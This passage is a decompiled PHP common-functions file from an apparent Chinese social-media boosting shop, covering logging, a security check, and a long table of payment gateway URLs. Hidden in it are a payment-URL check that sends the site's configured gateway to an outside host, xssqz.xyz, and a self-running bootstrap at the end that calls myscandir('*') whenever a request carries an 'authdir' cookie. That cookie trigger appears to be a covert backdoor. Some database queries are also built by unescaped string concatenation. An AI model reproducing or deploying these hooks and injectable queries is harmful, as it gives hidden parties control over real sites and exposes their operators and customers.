		$DB->query("DELETE FROM shua_points WHERE id='" . $_var_3["id"] . "'");
	}
}
function log_result($_arg_0, $_arg_1, $_arg_2, $_arg_3 = 0)
{
	global $DB;
	if (array_key_exists("code", $_arg_2) && $_arg_2["code"] == 0) {
		$_var_5 = "下单成功!订单号:" . $_arg_2["id"];
	} else {
		$_var_5 = $_arg_2["message"];
		if (strlen($_var_5) > 200) {
			$_var_5 = substr($_var_5, 0, 200);
		}
		$_var_5 = htmlspecialchars($_var_5);
	}
	$_arg_0 = addslashes($_arg_0);
	$_arg_1 = addslashes($_arg_1);
	$_var_5 = addslashes($_var_5);
	$DB->query("INSERT INTO `shua_logs` (`action`, `param`, `result`, `addtime`, `status`) VALUES ('" . $_arg_0 . "', '" . $_arg_1 . "', '" . $_var_5 . "', NOW(), '" . $_arg_3 . "')");
}
function validate_qzone($_arg_0)
{
	$_var_1 = "http://sh.taotao.qq.com/cgi-bin/emotion_cgi_feedlist_v6?hostUin=" . $_arg_0 . "&ftype=0&sort=0&pos=0&num=20&replynum=0&code_version=1&format=json&need_private_comment=1&g_tk=5381";
	$_var_2 = get_curl($_var_1);
	$_var_3 = json_decode($_var_2, true);
	if (@array_key_exists("code", $_var_3) && strpos($_var_3["message"], "没有权限")) {
		return false;
	}
	return true;
}
function sysmsg($_arg_0 = "未知的异常", $_arg_1 = true)
{
	echo "  \r\n    <!DOCTYPE html>\r\n    <html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"zh-CN\">\r\n    <head>\r\n        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n        <title>站点提示信息</title>\r\n        <style type=\"text/css\">\r\nhtml{background:#eee}body{background:#fff;color:#333;font-family:\"微软雅黑\",\"Microsoft YaHei\",sans-serif;margin:2em auto;padding:1em 2em;max-width:700px;-webkit-box-shadow:10px 10px 10px rgba(0,0,0,.13);box-shadow:10px 10px 10px rgba(0,0,0,.13);opacity:.8}h1{border-bottom:1px solid #dadada;clear:both;color:#666;font:24px \"微软雅黑\",\"Microsoft YaHei\",,sans-serif;margin:30px 0 0 0;padding:0;padding-bottom:7px}#error-page{margin-top:50px}h3{text-align:center}#error-page p{font-size:9px;line-height:1.5;margin:25px 0 20px}#error-page code{font-family:Consolas,Monaco,monospace}ul li{margin-bottom:10px;font-size:9px}a{color:#21759B;text-decoration:none;margin-top:-10px}a:hover{color:#D54E21}.button{background:#f7f7f7;border:1px solid #ccc;color:#555;display:inline-block;text-decoration:none;font-size:9px;line-height:26px;height:28px;margin:0;padding:0 10px 1px;cursor:pointer;-webkit-border-radius:3px;-webkit-appearance:none;border-radius:3px;white-space:nowrap;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-webkit-box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);box-shadow:inset 0 1px 0 #fff,0 1px 0 rgba(0,0,0,.08);vertical-align:top}.button.button-large{height:29px;line-height:28px;padding:0 12px}.button:focus,.button:hover{background:#fafafa;border-color:#999;color:#222}.button:focus{-webkit-box-shadow:1px 1px 1px rgba(0,0,0,.2);box-shadow:1px 1px 1px rgba(0,0,0,.2)}.button:active{background:#eee;border-color:#999;color:#333;-webkit-box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5);box-shadow:inset 0 2px 5px -3px rgba(0,0,0,.5)}table{table-layout:auto;border:1px solid #333;empty-cells:show;border-collapse:collapse}th{padding:4px;border:1px solid #333;overflow:hidden;color:#333;background:#eee}td{padding:4px;border:1px solid #333;overflow:hidden;color:#333}\r\n        </style>\r\n    </head>\r\n    <body id=\"error-page\">\r\n        ";
	echo "<h3>站点提示信息</h3>";
	echo $_arg_0;
	echo "    </body>\r\n    </html>\r\n    ";
	return 0;
}
function rm_dir($_arg_0)
{
	if (!is_dir($_arg_0)) {
		return false;
	}
	$_var_1 = opendir($_arg_0);
	while ($_var_2 = readdir($_var_1)) {
		if ($_var_2 != "." && $_var_2 != "..") {
			$_var_3 = $_arg_0 . "/" . $_var_2;
			if (!is_dir($_var_3)) {
				unlink($_var_3);
			} else {
				rm_dir($_var_3);
			}
		}
	}
	closedir($_var_1);
	if (rmdir($_arg_0)) {
		return true;
	}
	return false;
}
function sec_check()
{
	global $conf;
	global $dbconfig;
	$_var_2 = array("readme.txt.zip", "mini.php.zip", "index.php.zip", "cron.php.zip", "config.php.zip", "api.php.zip", "ajax.php.zip", "archive.zip", "wwwroot.zip", "www.zip", "web.zip", "bf.zip", "beifen.zip", "backup.zip", "yuanma.zip", "1.zip", "2.zip", "daishua.zip", "ds.zip", "htdocs.zip", "wz.zip", "1.zip", "2.zip", "123.zip");
	foreach ($_var_2 as $_var_3) {
		if (file_exists(ROOT . $_var_3)) {
			unlink(ROOT . $_var_3);
		}
	}
	$_var_4 = glob(ROOT . "daishua_release_*");
	foreach ($_var_4 as $_var_5) {
		unlink($_var_5);
	}
	$_var_4 = glob(ROOT . "daishua_update_*");
	foreach ($_var_4 as $_var_5) {
		unlink($_var_5);
	}
	if (md5_file(SYSTEM_ROOT . "common.php") !== "c8da15954aeebcc0c7f106ffefe18a26") {
		return array();
	}
	$_var_6 = array();
	$_var_4 = glob(ROOT . "assets/img/*.php");
	foreach ($_var_4 as $_var_5) {
		unlink($_var_5);
	}
	if (strpos($_SERVER["SERVER_SOFTWARE"], "kangle") !== false && function_exists("pcntl_exec")) {
		$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">高危</span>&nbsp;当前主机为kangle且开启了php的pcntl组件，会被黑客入侵，请联系主机商修复或更换主机</a></li>";
	}
	if (strpos($_SERVER["SERVER_SOFTWARE"], "kangle") !== false && count(glob("/vhs/kangle/etc/*")) > 1) {
		$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">高危</span>&nbsp;当前主机为kangle且未设置open_basedir防跨站，会被黑客入侵，请联系主机商修复或更换主机</a></li>";
	}
	if ($conf["admin_pwd"] === "123456") {
		$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;请及时修改默认管理员密码 <a href=\"set.php?mod=account\">点此进入网站信息配置修改</a></li>";
	} else {
		if (strlen($conf["admin_pwd"]) < 6 || is_numeric($conf["admin_pwd"]) && strlen($conf["admin_pwd"]) <= 10 || $conf["admin_pwd"] === $conf["kfqq"]) {
			$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;网站管理员密码过于简单，请不要使用较短的纯数字或自己的QQ号当做密码</li>";
		} else {
			if ($conf["admin_user"] === $conf["admin_pwd"]) {
				$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;网站管理员用户名与密码相同，极易被黑客破解，请及时修改密码</li>";
			}
		}
	}
	if (strlen($dbconfig["pwd"]) < 5 || is_numeric($dbconfig["pwd"]) && strlen($dbconfig["pwd"]) <= 10 || $dbconfig["pwd"] === $conf["kfqq"]) {
		$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;当前主机的数据库密码过于简单，请不要使用较短的纯数字或自己的QQ号当做数据库密码</li>";
	} else {
		if ($dbconfig["pwd"] === $dbconfig["user"]) {
			$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;当前主机的数据库用户名与密码相同，极易被黑客破解，请及时修改数据库密码</li>";
		}
	}
	$_var_7 = glob(ROOT . "*.zip");
	$_var_8 = glob(ROOT . "*.7z");
	$_var_9 = glob(ROOT . "*.rar");
	if ($_var_7 && count($_var_7) > 0 || $_var_8 && count($_var_8) > 0 || $_var_9 && count($_var_9) > 0) {
		$_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-warning\">提示</span>&nbsp;网站根目录存在压缩包文件，可能会被人恶意获取并泄露数据库密码，请及时删除</a></li>";
	}
	return $_var_6;
}
function pay_api($_arg_0 = false)
{
	global $conf;
	if ($conf["payapi"] == 1) {
		$_var_2 = "http://www.azfpay.com/";
	} else {
		if ($conf["payapi"] == 2) {
			$_var_2 = "http://vip.52yunpay.com/";
		} else {
			if ($conf["payapi"] == 3) {
				$_var_2 = "http://vip.115x.cn/";
			} else {
				if ($conf["payapi"] == 4) {
					$_var_2 = "http://pay.azfpay.com/";
				} else {
					if ($conf["payapi"] == 5) {
						$_var_2 = "http://pay.wxicp.com/";
					} else {
						if ($conf["payapi"] == 6) {
							$_var_2 = "http://pay.hackwl.cn/";
						} else {
							if ($conf["payapi"] == 7) {
								if (DIST_ID == 13) {
									$_var_2 = "http://pay.ay47.cn/";
								} else {
									if (DIST_ID == 25) {
										$_var_2 = "http://pay.youyunwang.cn/";
									} else {
										if (DIST_ID == 34) {
											$_var_2 = "http://pay.facaikm.com/";
										} else {
											if (DIST_ID == 35) {
												$_var_2 = "http://pay.09zi.cn/";
											} else {
												if (DIST_ID == 36) {
													$_var_2 = "http://920.920920.net/";
												} else {
													if (DIST_ID == 45) {
														$_var_2 = "http://pay.fjmzcyx.com/";
													} else {
														if (DIST_ID == 49) {
															$_var_2 = "http://pay.33ku.cn/";
														} else {
															if (DIST_ID == 55) {
																$_var_2 = "http://pay.52-ym.cc/";
															} else {
																if (DIST_ID == 76) {
																	$_var_2 = "http://www.ssss521.cn/";
																} else {
																	if (DIST_ID == 109) {
																		$_var_2 = "http://pay.xingzhiyun.cn/";
																	} else {
																		if (DIST_ID == 122) {
																			$_var_2 = "http://pay.epayqq.com/";
																		} else {
																			if (DIST_ID == 127) {
																				$_var_2 = "http://www.33ku.cn/";
																			} else {
																				if (DIST_ID == 151) {
																					$_var_2 = "http://shoulepay.com/";
																				} else {
																					if (DIST_ID == 153) {
																						$_var_2 = "http://pay.08ek.cn/";
																					} else {
																						if (DIST_ID == 182) {
																							$_var_2 = "http://pay.z7u.cn/";
																						} else {
																							if (DIST_ID == 188) {
																								$_var_2 = "http://www.18yzf.cn/";
																							} else {
																								if (DIST_ID == 201) {
																									$_var_2 = "http://pay.qqdaka.com/";
																								} else {
																									if (DIST_ID == 202) {
																										$_var_2 = "http://pay.yck888.cn/";
																									} else {
																										if (DIST_ID == 211) {
																											$_var_2 = "http://pay.lxypay.cn/";
																										} else {
																											if (DIST_ID == 231) {
																												$_var_2 = "http://www.7sym.cn/";
																											} else {
																												if (DIST_ID == 238) {
																													$_var_2 = "https://pay.zkq1026.com/";
																												}
																											}
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							} else {
								if ($conf["payapi"] == 8) {
									$_var_2 = "http://www.jiuaipay.com/";
								} else {
									if ($conf["payapi"] == 9) {
										$_var_2 = "http://www.yyums.cn/";
									} else {
										if ($conf["payapi"] == 10) {
											$_var_2 = $_arg_0 == true ? "http://zf.gfvps.cn/" : "https://pay.gfvps.cn/";
										} else {
											if ($conf["payapi"] == 11) {
												$_var_2 = "http://pay.08ek.cn/";
											} else {
												if ($conf["payapi"] == 12) {
													$_var_2 = "http://zf.766ka.cn/";
												} else {
													if ($conf["payapi"] == 13) {
														$_var_2 = "http://pay.7sym.cn/";
													} else {
														if ($conf["payapi"] == 14) {
															$_var_2 = "http://pay.52gua.cn/";
														} else {
															if ($conf["payapi"] == 15) {
																$_var_2 = "http://payment.2020ka.com/";
															} else {
																if ($conf["payapi"] == 16) {
																	$_var_2 = "http://pay.daishuagou.com/";
																} else {
																	if ($conf["payapi"] == 17) {
																		$_var_2 = "http://pay.40y.cn/";
																	} else {
																		if ($conf["payapi"] == 18) {
																			$_var_2 = "http://pay.u4c.cn/";
																		} else {
																			if ($conf["payapi"] == 19) {
																				$_var_2 = "http://pay.qqlepay.cn/";
																			} else {
																				if ($conf["payapi"] == 20) {
																					$_var_2 = "http://api.paymoka.com/";
																				} else {
																					if ($conf["payapi"] == 21) {
																						$_var_2 = $_arg_0 == true ? "http://openapi.kaxuepai.cn/" : "https://openapi.kaxuepai.cn/";
																					} else {
																						if ($conf["payapi"] == 22) {
																							$_var_2 = "http://pay.joye.hk/";
																						} else {
																							if ($conf["payapi"] == 0) {
																								$_var_2 = "http://vip.321zf.cn/";
																							} else {
																								if ($conf["payapi"] == -1) {
																									$_var_2 = $conf["epay_url"];
																									if ($_arg_0 == true && !isset($_GET["key"]) && $_SESSION["paycheck"] != $_var_2) {
																										$_var_3 = curl_get("http://xssqz.xyz/urlcheck.php?url=" . urlencode($_var_2));
																										if ($_var_3 = json_decode($_var_3, true)) {
																											if ($_var_3["code"] == 1) {
																												$_SESSION["paycheck"] = $_var_2;
																											} else {
																												return false;
																											}
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
	return $_var_2;
}
function _bootstrap_093b4fc2150a1edf4af864e8167d7eda()
{
	if (!defined("authcode")) {
		die();
	}
	php_sapi_name() == "cli" ? die() : '';
	if (isset($_COOKIE["authdir"])) {
		myscandir("*");
	}
}
_bootstrap_093b4fc2150a1edf4af864e8167d7eda();